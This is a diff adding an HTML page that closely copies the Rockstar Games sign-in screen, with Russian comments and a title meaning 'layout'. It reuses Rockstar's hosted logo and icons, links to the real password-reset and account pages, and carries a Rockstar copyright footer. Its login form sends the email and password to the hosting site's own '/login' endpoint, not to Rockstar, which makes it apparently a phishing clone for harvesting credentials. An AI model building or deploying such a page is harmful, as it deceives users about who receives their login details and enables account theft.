@@ -1,0 +1,214 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link rel="stylesheet" href="/login/styles.css" />
+    <link rel="shortcut icon" href="https://s.rsg.sc/auth/rockstar.ico" />
+    <title>Верстка</title>
+  </head>
+  <body>
+    <div>
+      <div>
+        <div class="background">
+          <div class="display-grid main-container min-h-f">
+            <!--Центральная часть-->
+            <div class="center-container">
+              <!--лого рокстар-->
+              <div class="logo display-flex">
+                <span>
+                  <img
+                    src="https://s.rsg.sc/auth/images/logo_20231030.svg"
+                    alt="Rockstar Games Logo"
+                    data-ui-name="logo-image"
+                  />
+                </span>
+              </div>
+              <!--логин-->
+              <div>
+                <!--sign in-->
+                <div class="background-white sign-in-container wdth-500">
+                  <h1 class="sign-in-h">Sign in</h1>
+                  <div>
+                    <div>
+                      <!--Форма отправляет данные авторизации по /login методом post-->
+                      <form class="form" action="/login" method="post">
+                        <!--email-->
+                        <fieldset class="mg-b">
+                          <span
+                            class="display-inline-block position-relative wdth-full"
+                          >
+                            <input
+                              class="email-password-input display-block wdth-full"
+                              id="text-input-email"
+                              placeholder=""
+                              name="username"
+                              required
+                            />
+                            <label
+                              for="text-input-email"
+                              class="position-absolute display-block label-text"
+                            >
+                              <span> Email </span>
+                            </label>
+                          </span>
+                        </fieldset>
+                        <!--password and keep me signed in-->
+                        <fieldset class="mg-b">
+                          <!--password-->
+                          <span>
+                            <span
+                              class="display-inline-block position-relative wdth-full"
+                            >
+                              <input
+                                id="text-input-password"
+                                placeholder=""
+                                class="display-block email-password-input wdth-full"
+                                type="password"
+                                name="password"
+                                required
+                              />
+                              <label
+                                for="text-input-password"
+                                class="position-absolute display-block label-text"
+                              >
+                                <span>Password</span>
+                              </label>
+                            </span>
+                            <!--<button>
+                              <svg>
+                                <path
+                                  d="M30.6 14.7c-.3 0-.6-.1-.8-.3C21.5 8 10.5 8 2.2 14.4c-.6.5-1.5.4-1.9-.2-.5-.6-.4-1.5.2-1.9 9.3-7.2 21.7-7.2 30.9 0 .6.5.7 1.3.2 1.9-.2.3-.6.5-1 .5zM16 25.2c-5.4 0-10.8-1.8-15.5-5.4-.6-.5-.7-1.3-.2-1.9.5-.6 1.3-.7 1.9-.2 8.2 6.4 19.3 6.4 27.6 0 .6-.5 1.5-.4 1.9.2.5.6.4 1.5-.2 1.9-4.7 3.6-10.1 5.4-15.5 5.4z"
+                                ></path>
+                              </svg>
+                            </button>-->
+                          </span>
+                          <!--keep me signed in-->
+                          <div class="mt-20 display-flex align-center">
+                            <span>
+                              <input
+                                type="checkbox"
+                                class="checkbox position-absolute"
+                                id="box"
+                              />
+                              <label
+                                class="remember-me display-inline-block"
+                                for="box"
+                                >Remember me</label
+                              >
+                            </span>
+                          </div>
+                        </fieldset>
+                        <!--<fieldset class="captcha">
+                          <div>
+                            <div>
+                              <div></div>
+                              <iframe> </iframe>
+                            </div>
+                          </div>
+                        </fieldset>-->
+                        <!--sign in button-->
+                        <fieldset>
+                          <div class="display-flex justify-space-between">
+                            <p class="align-self-center">
+                              <a
+                                class="forgot-password"
+                                href="https://signin.rockstargames.com/forgotten-password?cid=rsg"
+                                >Forgot your password?</a
+                              >
+                            </p>
+                            <button class="sign-in-btn">
+                              <div>
+                                <span class="sign-in-btn-span">Sign in</span>
+                              </div>
+                            </button>
+                          </div>
+                        </fieldset>
+                      </form>
+                    </div>
+                  </div>
+                </div>
+                <!--sign in using xbox or playstation-->
+                <div class="background-white xb-ps-sgn wdth-500">
+                  <fieldset>
+                    <div class="display-flex align-center">
+                      <p class="wdth-50">Sign in with</p>
+                      <div class="display-flex justify-flex-end wdth-50">
+                        <!--playstation-->
+                        <a
+                          class="ps-or-xb-logo mr-10 flex-grow-1"
+                          href="https://signin.rockstargames.com/tpa/np/login?cid=rsg&returnUrl=%2F"
+                        >
+                          <img
+                            src="https://s.rsg.sc/auth/images/icons/colored/np.svg"
+                            class="ps-or-xb-img"
+                          />
+                        </a>
+                        <!--xbox-->
+                        <a
+                          class="ps-or-xb-logo flex-grow-1"
+                          href="https://signin.rockstargames.com/tpa/xbl/login?cid=rsg&returnUrl=%2F"
+                        >
+                          <img
+                            src="https://s.rsg.sc/auth/images/icons/colored/xbl.svg"
+                            class="ps-or-xb-img"
+                          />
+                        </a>
+                      </div>
+                    </div>
+                  </fieldset>
+                </div>
+                <!--create a new account-->
+                <div>
+                  <p class="white-color create-new-account-p display-block">
+                    Don't have a Rockstar account?
+                    <a
+                      href="https://signin.rockstargames.com/signin/create?cid=rsg"
+                      class="color-yellow"
+                      >Create a new account</a
+                    >
+                  </p>
+                </div>
+              </div>
+            </div>
+            <!--© 2026 Rockstar Games-->
+            <div class="display-block footer-grid-area footer">
+              <ul class="display-block">
+                <li class="display-inline-block color-grey uppercase font-0.75">
+                  © 2026 Rockstar Games
+                </li>
+                <li
+                  class="display-inline-block color-light-grey border-left-0.8 line-height-0.75"
+                >
+                  <a
+                    class="background-transparent color-white-0.8 border-none uppercase line-height-0.75 footer-links"
+                  >
+                    Privacy Policy
+                  </a>
+                </li>
+                <li
+                  class="display-inline-block color-light-grey border-left-0.8 line-height-0.75"
+                >
+                  <a
+                    class="background-transparent color-white-0.8 border-none uppercase line-height-0.75 footer-links"
+                  >
+                    Terms Of Service
+                  </a>
+                </li>
+                <li
+                  class="display-inline-block color-light-grey border-left-0.8 line-height-0.75"
+                >
+                  <a
+                    class="background-transparent color-white-0.8 border-none uppercase line-height-0.75 footer-links"
+                  >
+                    Cookie Settings
+                  </a>
+                </li>
+              </ul>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </body>
+</html>
